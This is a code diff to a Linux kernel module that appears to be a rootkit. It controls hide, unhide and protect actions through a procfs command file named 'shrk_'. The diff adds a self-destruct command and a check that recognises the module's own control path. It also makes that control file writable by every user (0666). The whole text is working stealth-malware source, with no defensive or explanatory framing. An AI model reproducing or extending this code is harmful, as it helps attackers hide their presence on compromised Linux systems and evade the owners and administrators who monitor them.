@@ -4,6 +4,7 @@
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/slab.h>
+#include <linux/path.h>
 
 struct cmd {
   uint8_t        code;
@@ -11,6 +12,7 @@ struct cmd {
 };
 
 struct cmd cmds[] = {
+    {.code = 'D', .handler = cmd_destruct},
     {.code = 'P', .handler = cmd_protect},
     {.code = 'U', .handler = cmd_unhide },
     {.code = 'H', .handler = cmd_hide   },
@@ -18,6 +20,22 @@ struct cmd cmds[] = {
 
 #define CMD_SIZE_MAX (PATH_MAX + 10)
 #define cmd_count()  (sizeof(cmds) / sizeof(cmds[0]))
+
+bool is_cmd_path(struct path *p){
+  // in debug mode every process should be able to access the cmd interface for testing
+  if(SHRK_DEBUG)
+    return false;
+
+  if(NULL == p->mnt->mnt_sb ||
+     NULL == p->mnt->mnt_sb->s_type ||
+     NULL == p->mnt->mnt_sb->s_type->name)
+    return false;
+
+  if (strcmp(p->mnt->mnt_sb->s_type->name, "proc") != 0)
+    return false;
+
+  return (strcmp(p->dentry->d_name.name, "shrk_" SHRK_CLIENT_ID) == 0);
+}
 
 loff_t __cmds_lseek(struct file *file, loff_t off, int whence) {
   return 0;
@@ -72,7 +90,7 @@ static const struct proc_ops cmds_fops = {
 };
 
 bool cmds_install(void) {
-  if ((cmds_file = proc_create("shrk_" SHRK_CLIENT_ID, 0644, NULL, &cmds_fops)) == NULL) {
+  if ((cmds_file = proc_create("shrk_" SHRK_CLIENT_ID, 0666, NULL, &cmds_fops)) == NULL) {
     debg("failed to create the command procfs file");
     return false;
   }
